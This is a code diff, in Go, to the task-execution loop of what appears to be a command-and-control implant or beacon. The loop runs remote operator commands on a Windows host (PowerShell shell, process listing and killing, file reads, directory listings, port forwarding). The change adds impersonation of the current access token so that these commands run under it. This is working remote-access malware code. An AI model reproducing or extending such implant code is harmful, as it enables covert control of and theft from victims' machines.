@@ -25,6 +25,8 @@ var PortFwdMap = make(map[int]string)
 var PortFwdListenerMap = make(map[int]net.Listener)
 var PortFwdListenerQuitMap = make(map[int](chan bool))
 
+var Token, _ = hg.GetCurrentToken()
+
 func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string, key []byte, beacon_name string, rhost string, url string) {
 	for _, task := range tasksToDo {
 		var data string
@@ -35,21 +37,21 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 
 		switch task {
 		case "shell":
-			data, _ = hg.PsReturn(taskData)
+			data, _ = hg.PsReturnT(taskData, Token)
 		case "whoami":
 			data, _ = initialization.GetUsername()
 		case "hostname":
 			data, _ = hg.GetHostname()
 		case "ps":
-			data, _ = hg.PsReturn("tasklist")
+			data, _ = hg.PsReturnT("tasklist", Token)
 		case "ifconfig":
-			data, _ = hg.PsReturn("ipconfig")
+			data, _ = hg.PsReturnT("ipconfig", Token)
 		case "kill":
 			pid := taskData
-			hg.PsNoOut("Stop-Process -Id " + pid)
+			hg.PsNoOutT("Stop-Process -Id "+pid, Token)
 			data = fmt.Sprintf("killed process (%s)", pid)
 		case "cat":
-			data, _ = hg.PsReturn("type " + taskData)
+			data, _ = hg.PsReturnT("type "+taskData, Token)
 		case "sleep":
 			newSleepTime := taskData
 			*sleep, _ = strconv.Atoi(newSleepTime)
@@ -108,7 +110,7 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 		case "pwd":
 			data, _ = hg.GetPwd()
 		case "ls":
-			data, _ = hg.PsReturn("dir " + taskData)
+			data, _ = hg.PsReturnT("dir "+taskData, Token)
 		case "cd":
 			os.Chdir(taskData)
 			data = fmt.Sprintf("changed directory to %s", taskData)
@@ -176,6 +178,8 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 			}
 		case "died":
 			data = "died"
+		case "":
+
 		default:
 			data = "command not supported"
 		}
